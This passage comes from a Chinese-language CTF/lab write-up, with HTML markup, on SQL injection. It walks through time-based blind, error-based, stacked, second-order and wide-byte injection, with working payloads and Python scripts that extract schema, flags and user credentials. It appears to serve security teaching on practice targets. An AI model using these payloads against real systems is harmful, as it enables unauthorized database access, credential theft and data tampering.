class="string">&#x27;u&#x27;</span>:f&quot;concat(if(substr((&#123;payload&#125;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;,sleep(1),0),1);&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            print(params)</span><br><span class="line">            try:</span><br><span class="line">                response <span class="operator">=</span> requests.get(url<span class="operator">=</span>url,params<span class="operator">=</span>params,timeout<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line">                #print(&quot;执行失败&quot;)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                #print(&quot;执行成功&quot;)</span><br><span class="line">                flag <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">                print(flag)                   </span><br></pre></td></tr></table></figure>
+<h3><span id="0x03二分法时间盲注">0X03（二分法时间盲注）</span></h3><p><img src="https://img-blog.csdnimg.cn/077c87b27294433c981d5e899962591d.png" alt="在这里插入图片描述"><br>提示用了单引号</p>
+<p>本关看靶场的话不知道注入点在哪(可能仅对我这个小白而言)<br>，但仔细去查看首页界面的js文件的话，可以发现api下传入的数据是ip和debug，ip这个的话我猜测是可注入的点，测试了一下，确实是这样<br><img src="https://img-blog.csdnimg.cn/b98dfefd435c40f9b7342d62457b4822.png" alt="在这里插入图片描述"><br>本地测试如下（post注入）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debug<span class="operator">=</span><span class="number">0</span><span class="operator">&amp;</span>ip<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(ascii(substr((select group_concat</span></span><br><span class="line"><span class="string">(table_name) from information_schema.tables where </span></span><br><span class="line"><span class="string">table_schema=database()),1,1))&gt;1,sleep(1),0) #</span></span><br></pre></td></tr></table></figure>
+<p>但由于这样比较缓慢，因此这里需要借用脚本，脚本内容如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://98966a40-1d76-48f8-a258-f9a70e6ff8dc.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">result</span> <span class="operator">=</span> &quot;&quot;</span><br><span class="line">i <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">while <span class="literal">True</span>:</span><br><span class="line">    i <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">    head <span class="operator">=</span> <span class="number">32</span></span><br><span class="line">    tail <span class="operator">=</span> <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    while head <span class="operator">&lt;</span> tail:</span><br><span class="line">        mid <span class="operator">=</span> (head <span class="operator">+</span> tail) <span class="operator">&gt;&gt;</span> <span class="number">1</span></span><br><span class="line">        # 查数据库</span><br><span class="line">        payload <span class="operator">=</span> &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="line">        # 查字段</span><br><span class="line">        # payload <span class="operator">=</span> &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # 查flag</span><br><span class="line">        #payload <span class="operator">=</span> &quot;select flaga from ctfshow_flagx&quot;</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        try:#try后为检测范围</span><br><span class="line">            r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data, timeout<span class="operator">=</span><span class="number">1</span>)#延时超过一秒就按异常处理，因为设置的是一秒，所以异常时即为正确情况</span><br><span class="line">            tail <span class="operator">=</span> mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e : #检测到异常时</span><br><span class="line">            head <span class="operator">=</span> mid <span class="operator">+</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">    if head <span class="operator">!=</span> <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        break</span><br><span class="line">    print(<span class="keyword">result</span>)</span><br></pre></td></tr></table></figure>
+<h2><span id="报错注入">报错注入</span></h2><h3><span id="0x01">0X01</span></h3><p>发现在unname中注入会被转义，所以我们选择在passwd中进行注入<br><img src="https://img-blog.csdnimg.cn/dc494b291314429c9ebb4b9e21f9cacc.png" alt="在这里插入图片描述"><br>此时采用xpath函数来破解<br>获取表payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin <span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1)),1)#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/7202c93f86f649a993e41dfbc2f550d5.png" alt="在这里插入图片描述"><br> 获取表名payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1)),1) #&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/7a830df3539647b49407dc9a6ec3c951.png" alt="在这里插入图片描述"><br> 获取列名payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1)),1) #&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p> 获取字段信息payload </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27; or updatexml(1,concat(0x7e,(select email_id from security.emails limit 0,1)),1) #&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/3599754c73bf4a7f8e6b80bfec197c3b.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> $<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br><span class="line">返回逻辑</span><br><span class="line">过滤updatexml extractvalue </span><br></pre></td></tr></table></figure>
+<p>这里把两个常用的报错注入函数都给ban了，那这里就需要利用双查询注入了<br><a target="_blank" rel="noopener" href="https://www.2cto.com/article/201303/192718.html">详细讲解双查询注入</a><br>因此本关我们构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a%23</span></span><br><span class="line"><span class="string">爆列</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">ctfshow_flags&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="operator">%</span><span class="number">23</span></span><br><span class="line">爆flag</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat((select flag2 from ctfshow_flags ),0x7e,floor(rand()*2))a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
+<h2><span id="堆叠注入">堆叠注入</span></h2><h3><span id="0x01">0X01</span></h3><p><img src="https://img-blog.csdnimg.cn/6974361e9a1540ae88b261671a99207e.png" alt="在这里插入图片描述">本关我们尝试以弱口令admin作为账号，对pwd进行堆叠注入测试，构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;insert into users(id,username,password) values(88,&#x27;</span>aaa<span class="string">&#x27;,&#x27;</span>bbb<span class="string">&#x27;);#</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/b39c2c8a9707415196317d5f32583027.png" alt="在这里插入图片描述"><br>此时查看sql数据库<br><img src="https://img-blog.csdnimg.cn/da3a3d8b031140eb8290f2dfd156c61a.png" alt="在这里插入图片描述"><br>查看源码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username <span class="operator">=</span> mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> $_POST[&quot;login_password&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>username进行了转义，但pwd没有用函数进行限制,因此这里就出现了堆叠注入漏洞</p>
+<h3><span id="0x02">0X02</span></h3><p><img src="https://img-blog.csdnimg.cn/ade61852b2164432a633258171c71d19.png" alt="在这里插入图片描述"><br>打开靶场后，首先判断一下id包裹方式<br><img src="https://img-blog.csdnimg.cn/f0d15e4709e84dbdbfcc420fa433c868.png" alt="在这里插入图片描述"><br>判断出为单引号包裹，此时判断一下字段数<br><img src="https://img-blog.csdnimg.cn/3b4e215c6cb84794baca09dec859bd83.png" alt="在这里插入图片描述"><br>说明字段为2，此时尝试使用联合查询<br><img src="https://img-blog.csdnimg.cn/21a3f73802ee46bb924e99443d0a6b6d.png" alt="在这里插入图片描述"><br>发现联合查询被ban，此时我们无法使用联合查询进行注入，尝试使用堆叠注入，还有部分被过滤，select无法使用，我们可以使用show，进行爆库<br>构造如下payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/b012f18368f34adfaf618d5b9402d4ed.png" alt="在这里插入图片描述">爆表<br><img src="https://img-blog.csdnimg.cn/172fe8ed5af247e193bc41b19927e759.png" alt="在这里插入图片描述"><br>爆出列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/f615d20060a542f69f73ec12a7b2f639.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `words`;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/44d9cd5f11734a4ea22f287043bcde90.png" alt="在这里插入图片描述">这里我们可以看出这个words表是默认查询的表(这张表的结构是一个数字加一个字符串)<br>，众所周知show是无法查看字段信息的，我们该如何获取flag呢<br>这里alert和rename没有被限制，我们可以利用rename将words这张表改名为words1，再将数字表改名为words，但是呢，此时他是缺少了一个id列的，因此我们可以用alert将flag列改名为id列，并规定类型为varchar，构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#</span></span><br></pre></td></tr></table></figure>
+
+<p>此时再利用万能语句，即可得到flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/bac285ef04ed458491906732cebc559c.png" alt="在这里插入图片描述">这里还有一种方法，就是采用预编译的方法</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>是设置一个新列</span><br><span class="line"><span class="keyword">prepare</span>是进行定义一个语句</span><br><span class="line"><span class="keyword">execute</span>是执行</span><br></pre></td></tr></table></figure>
+<p>构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/7e9182768a6d40859295733d5ca07588.png" alt="在这里插入图片描述">这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;sEt @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/76c1f9ab27954f09872486074f066392.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x03">0X03</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>师傅说过滤的越多越好</span><br><span class="line">if(preg_match(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,$username))&#123;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现可以进行堆叠注入，show未被ban，因此可用show来获取表名列名，payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;;show tables;#</span></span><br><span class="line"><span class="string">admin&#x27;</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> `ctfshow_flagasa`;#</span><br></pre></td></tr></table></figure>
+
+<p>有如下两种方法获取flag</p>
+<p>预编译</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;;prepare quan9i from concat(&#x27;</span>selec<span class="string">&#x27;,&#x27;</span>t <span class="operator">*</span> <span class="keyword">from</span> `ctfshow_flagasa`<span class="string">&#x27;);execute quan9i;#</span></span><br></pre></td></tr></table></figure>
+<p>handle<br>不熟悉可以看这篇文章<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15023289/2559944">https://blog.51cto.com/u_15023289/2559944</a>，我们在这里所使用其的中心思想就是<code>HANDLER … OPEN 语句打开一个表，后续的 HANDLER … READ 语句可以访问它。此表对象不被其他会话共享，并且直到调用 HANDLER … CLOSE 或者会话终止才会关闭。</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler ctfshow_flagasa <span class="keyword">open</span>;handler ctfshow_flagasa read <span class="keyword">first</span>;</span><br></pre></td></tr></table></figure>
+<h2><span id="二次注入">二次注入</span></h2><p>进入界面后如下图所示<br><img src="https://img-blog.csdnimg.cn/5345d1aa85ae43209070fbbfe9453555.png" alt="在这里插入图片描述"><br>发现下方有注册的，我们点击注册，用弱口令admin来尝试，命名为admin’#，密码设置为111，如下图<br><img src="https://img-blog.csdnimg.cn/3b04cc57f22d44fa9896d6326124b298.png" alt="在这里插入图片描述"><br>此时查询数据库，发现注册的已经插入数据库中<br><img src="https://img-blog.csdnimg.cn/e82186b3da214199b1983c1572ffd6a5.png" alt="在这里插入图片描述"><br>我们登录看看，如下图<br><img src="https://img-blog.csdnimg.cn/14dba507c8fc4a72ae201ef26c5f12c5.png" alt="在这里插入图片描述"><br>发现是更改密码的，我们试着将111改123，此时查看数据库<br><img src="https://img-blog.csdnimg.cn/f2157307c46143f2879df89b081d3b93.png" alt="在这里插入图片描述"><br>发现更改了admin的密码，即说明注入成功<br>那他到底能有什么作用呢，我们可以通过一段php代码来体现它的作用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);<span class="comment">#引用数据库连接文件</span></span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="comment">//关闭报错</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY id&quot;</span>;<span class="comment">//sql语句是拿出所有数据按照id排列，即从id=1直至最后</span></span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>); <span class="comment">//此函数指的是仅执行一种语句，为了防止多个语句注入，并将结果赋值给新变量</span></span><br><span class="line"><span class="variable">$num</span>=mysql_num_rows(<span class="variable">$result</span>);<span class="comment">//此函数指返回结果集中行的数目，新变量$num就是这个数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$num</span>; ++<span class="variable">$i</span>) &#123; <span class="comment">//for 循环语句,起始时变量i为0，设置条件为变量i小于变量num，即运行到变量num-1，每次执行后变量加一继续执行</span></span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);<span class="comment">//取出变量result作为一组关联数组赋值给新变量row</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$row</span>[<span class="number">1</span>];<span class="comment">//将变量row的第一列赋值给变量username</span></span><br><span class="line"><span class="variable">$sql_detail</span> = <span class="string">&quot;SELECT * FROM users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>; <span class="comment">//将变量username用单引号包裹</span></span><br><span class="line"><span class="variable">$result_detail</span>=mysql_query(<span class="variable">$sql_detail</span>);<span class="comment">//仅执行一种语句，将结果赋值给新变量$result_detail</span></span><br><span class="line"><span class="variable">$num_detail</span> = mysql_num_rows(<span class="variable">$result_detail</span>);<span class="comment">//计算变量$result_detail的行数赋值给新$num_detail</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$num_detail</span>; ++<span class="variable">$j</span>) &#123; <span class="comment">//for 循环语句，，起始时j为0，设置条件为j小于变量$num_detail，每次执行后加一继续执行</span></span><br><span class="line"><span class="variable">$row_detail</span> = mysql_fetch_array(<span class="variable">$result_detail</span>);<span class="comment">//将结果以关联数组形式联合起来，赋值给新变量</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&lt;&lt;&lt;END</span></span><br><span class="line"><span class="string">&lt;table border=&quot;1&quot; style=&quot;table-layout:fixed;&quot; width=&quot;1000&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;<span class="subst">$row_detail</span>[1]&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;<span class="subst">$row_detail</span>[2]&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/table&gt;</span></span><br><span class="line"><span class="string">END</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>执行结果为<br><img src="https://img-blog.csdnimg.cn/7800e01396424054953e125df194c6b8.png" alt="在这里插入图片描述"><br>用户名和密码被打印出来了！</p>
+<h2><span id="宽字节注入">宽字节注入</span></h2><h3><span id="0x01">0X01</span></h3><p><img src="https://img-blog.csdnimg.cn/7f33134ead024b549dab8869665c12c8.png" alt="在这里插入图片描述"><br>当我们输入<code>?id=1&#39;</code>时，发现多了一个反斜线，此时我们考虑到宽字节注入，尝试去构造一个字母与后面的\组成汉字，我们知道%df与\可以组成汉字<code>運</code>，构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span></span><br><span class="line">注：<span class="operator">%</span><span class="number">27</span>是单引号的url编码</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/a7b4acf061d24c22ac399c7fffb41ee2.png" alt="在这里插入图片描述"><br>�\ 实际上就是那个運字 ，此时我们就可以尝试进行注入<br>爆库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/46f79a80c5f0427da2a0cd2b417b07c5.png" alt="在这里插入图片描述">爆表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><font color="red">注:此时库名不能写<code>&#39;security&#39;</code>，因为出现了单引号，可以用<code>database()</code>或<code>十六进制</code>来进行代替</font><br><img src="https://img-blog.csdnimg.cn/e08f9ed9db5d41cea4c9c21d938d1bf8.png" alt="在这里插入图片描述">爆列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns </span><br><span class="line"><span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/0d298175f313497a99eb0d25a01ffbbd.png" alt="在这里插入图片描述"></p>
+<p>爆字段信息（下方以uesrs为例）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(username,<span class="number">0x7e</span>,password) <span class="keyword">from</span> security.users)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/75f8b2e50c074d9396b934b7aabcc7a2.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x02">0X02</span></h3><p>进入靶场后<br><img src="https://img-blog.csdnimg.cn/0fb2fe76f47345a4b92d7a7876053aa9.png" alt="在这里插入图片描述"><br>下方灰色处发现可以点击，点击进入<br><img src="https://img-blog.csdnimg.cn/9fd73725d97747ebb47e499946f7b59c.png" alt="在这里插入图片描述"><br>尝试宽字节注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/e04bcab89edd47c2b188b989df6fec88.png" alt="在这里插入图片描述"><br>发现报错，说明可以进行宽字节注入<br>那就开始日常的sql注入流程，判断字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; order by 6 --+</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/d12809bd6a924f3d9e61cbb00e8118e0.png" alt="在这里插入图片描述"><br>说明字段数为5，此时利用联合查询，看哪个有回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3,4,5 --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/961ff91a8d114ef09f6a4503af473646.png" alt="在这里插入图片描述"><br>发现3和5有回显位，此时利用3和5来爆库并得到当前用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,user(),4,database() --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/3313691932df49a98a2e2a46d8b2309d.png" alt="在这里插入图片描述">mozhe_discuz_stormgroup<br>此时再查表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,user(),4,(select group_concat(table_name) from</span></span><br><span class="line"><span class="string"> information_schema.tables where </span></span><br><span class="line"><span class="string"> table_schema=0x6d6f7a68655f64697363757a5f73746f726d67726f7570) --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/84cd1c054c894166a5c49c3d4463d945.png" alt="在这里插入图片描述">同时查两个表的列名</p>
